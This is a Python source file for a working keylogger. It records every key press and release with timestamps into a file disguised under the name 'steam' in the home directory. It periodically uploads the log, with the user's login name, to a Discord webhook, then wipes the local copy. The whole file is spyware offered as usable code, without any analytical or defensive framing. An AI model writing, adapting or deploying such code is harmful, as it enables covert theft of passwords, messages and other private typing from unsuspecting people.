from pynput import keyboard
from pathlib import Path
from datetime import datetime
from discord_webhook import DiscordWebhook
import os

max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long

url = ''
clear_after_send = True

def check_if_should_send(lines):
    if lines >= 300:
        webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
        file_path = Path.home() / "steam"
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with file_path.open('r') as file:
            webhook.add_file(file=file.read(), filename="keys.txt")
        if clear_after_send:
            with file_path.open('w') as file:
                file.write("")
        webhook.execute()

def ascii_replace(key):
    try:
        if str(key) == "<12>":
            return "numpad 5"
        elif str(key) == "<48>":
            return 0
        elif str(key) == "<49>":
            return 1
        elif str(key) == "<50>":
            return 2
        elif str(key) == "<51>":
            return 3
        elif str(key) == "<52>":
            return 4
        elif str(key) == "<53>":
            return 5
        elif str(key) == "<54>":
            return 6
        elif str(key) == "<55>":
            return 7
        elif str(key) == "<56>":
            return 8
        elif str(key) == "<57>":
            return 9
        elif str(key) == "<106>":
            return "numpad *"
        elif str(key) == "<107>":
            return "numpad +"
        elif str(key) == "<109>":
            return "numpad -"
        elif str(key) == "<111>":
            return "numpad /"
        elif str(key) == "<186>":
            return ";"
        elif str(key) == "<187>":
            return "="
        elif str(key) == "<188>":
            return ","
        elif str(key) == "<189>":
            return "-"
        elif str(key) == "<190>":
            return "."
        elif str(key) == "<191>":
            return "/"
        elif str(key) == "<192>":
            return "`"
        elif str(key) == "<222>":
            return "'"
        else:
            try: 
                key = key.name
            except:
                key = key.char
            
            if '\x01' in key:
                return "a"
            elif '\x02' in key:
                return "b"
            elif '\x03' in key:
                return "c"
            elif '\x04' in key:
                return "d"
            elif '\x05' in key:
                return "e"
            elif '\x06' in key:
                return "f"
            elif '\x07' in key:
                return "g"
            elif '\x08' in key:
                return "h"
            elif '\t' in key:
                return "i"
            elif '\n' in key:
                return "j"
            elif '\x0b' in key:
                return "k"
            elif '\x0c' in key:
                return "l"
            elif '\r' in key:
                return "m"
            elif '\x0e' in key:
                return "n"
            elif '\x0f' in key:
                return "o"
            elif '\x10' in key:
                return "p"
            elif '\x11' in key:
                return "q"
            elif '\x12' in key:
                return "r"
            elif '\x13' in key:
                return "s"
            elif '\x14' in key:
                return "t"
            elif '\x15' in key:
                return "u"
            elif '\x16' in key:
                return "v"
            elif '\x17' in key:
                return "w"
            elif '\x18' in key:
                return "x"
            elif '\x19' in key:
                return "y"
            elif '\x1a' in key:
                return "z"
            elif '\x1b' in key:
                return "["
            elif '\x1c' in key:
                return "\\"
            elif '\x1d' in key:
                return "]"
            else:
                return key
    except:
        return key

def on_press(key):
    key_name = ascii_replace(key)

    log = f"\n Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}"

    file_path = Path.home() / "steam"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log.lstrip("\n"))
    else:
        with file_path.open('r+') as file:
            if file.readline() == "":
                file.write(log.lstrip("\n"))
            else:
                file.write(log)

def on_release(key):
    key_name = ascii_replace(key)

    log = f"\nReleased: {str(key_name).rjust(max_length)} | {datetime.now()}"

    file_path = Path.home() / "steam"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log.lstrip("\n"))
    else:
        with file_path.open('r+') as file:
            if file.readline() == "":
                file.write(log.lstrip("\n"))
            else:
                file.write(log)
            lines = len(file.readlines())
        check_if_should_send(lines)

with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
    l.join()